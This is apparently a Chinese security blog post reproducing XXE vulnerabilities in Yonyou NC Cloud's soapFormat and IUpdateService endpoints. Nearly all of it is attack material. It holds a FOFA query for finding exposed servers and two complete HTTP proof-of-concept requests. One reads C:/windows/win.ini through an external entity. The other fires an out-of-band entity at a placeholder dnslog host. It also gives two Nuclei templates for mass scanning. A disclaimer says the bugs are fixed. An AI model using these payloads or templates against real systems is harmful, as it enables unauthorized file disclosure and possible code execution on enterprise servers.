# 原创
：  漏洞复现--用友NC Cloud XXE

# 漏洞复现--用友NC Cloud XXE

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。该产品soapFormat和IUpdateService存在XXE漏洞，可导致文件读取和RCE。

### 二：漏洞影响版本

NC Cloud

### 三：网络空间测绘查询

fofa:<br/> `body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c5231bee859b89dea0c08dbc28377037.jpeg"/><br/> POC1:

```
POST /uapws/soapFormat.ajax HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 259

msg=&lt;!DOCTYPE foo[&lt;!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"&gt; ]&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server%26xxe1two%3b&lt;/faultcode&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;%0a

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/48873c767ef5b2cf5859d266b7842218.jpeg"/><br/> POC2:

```
POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Host: X.X.X.X
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: urn:getResult
Content-Type: text/xml;charset=UTF-8
Content-Length: 394

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService"&gt;
&lt;soapenv:Header/&gt;
&lt;soapenv:Body&gt;
&lt;iup:getResult&gt;
&lt;!--type: string--&gt;
&lt;iup:string&gt;&lt;![CDATA[
&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM "http://dnslog"&gt;%aaa;%ccc;%ddd;]&gt;
&lt;xxx/&gt;]]&gt;&lt;/iup:string&gt;
&lt;/iup:getResult&gt;
&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6ef3e10271e8971ce36426ef14b51c76.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0c6295b2ae7331ec953e5d7f09475d15.jpeg"/>

### 五：批量检测

```
id: YongYou-NC-Cloud-XXE1

info:
  name: YongYou-NC-Cloud-XXE1
  author: 芝士土拨鼠
  severity: high
  description: NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。该产品soapFormat和IUpdateService存在XXE漏洞，可导致文件读取和RCE

requests:
  - raw:
      - |-
        POST /uapws/soapFormat.ajax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 259

        msg=&lt;!DOCTYPE foo[&lt;!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"&gt; ]&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server%26xxe1two%3b&lt;/faultcode&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;%0a

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - fonts
      - type: status
        status:
          - 200


```

```
id: YongYou-NC-Cloud-XXE2

info:
  name: YongYou-NC-Cloud-XXE2
  author: 芝士土拨鼠
  severity: high
  description: NC Cloud是指用友公司推出的大型企业数字化平台。支持公有云、混合云、专属云的灵活部署模式。该产品soapFormat和IUpdateService存在XXE漏洞，可导致文件读取和RCE

requests:
  - raw:
      - |-
        POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        SOAPAction: urn:getResult
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 397

        &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService"&gt;
        &lt;soapenv:Header/&gt;
        &lt;soapenv:Body&gt;
        &lt;iup:getResult&gt;
        &lt;!--type: string--&gt;
        &lt;iup:string&gt;&lt;![CDATA[
        &lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM "http://dnslog"&gt;%aaa;%ccc;%ddd;]&gt;
        &lt;xxx/&gt;]]&gt;&lt;/iup:string&gt;
        &lt;/iup:getResult&gt;
        &lt;/soapenv:Body&gt;
        &lt;/soapenv:Envelope&gt;

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - design
      - type: status
        status:
          - 200

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/db8d8584589644bfc7a9b28aab75857f.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d2dc9f04e601d02bf654f695b50c91f2.jpeg"/>
